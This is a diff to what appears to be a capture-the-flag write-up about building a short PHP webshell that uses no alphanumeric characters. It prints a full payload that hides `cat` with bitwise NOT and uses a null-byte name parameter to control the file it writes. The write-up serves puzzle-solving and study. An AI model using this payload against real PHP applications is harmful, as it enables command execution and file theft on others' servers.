@@ -97,7 +97,7 @@ And we know that php's `base64_decode()` will output empty string if its input d
 
 Our goal is writing a non valid character webshell and the length shold be less than 38.
 
-There are some tips, we can use some arithmetic operation like `XOR`, `NOT`, `AND`, ...
+There are some tips, we can use some arithmetic operation like `XOR`, `NOT`, `AND`, ... to construct the php code.
 
 So if we set data to ``` <?=`something`;%26name%3Dz.php%00```, the `$decoded` will be empty and the name can be controled.
 
@@ -107,7 +107,7 @@ We can run the php script now.
 
 ## Payload
 
-`data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00`
+``` data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00```
 
 `~%9c%9e%8b` is `cat`
 
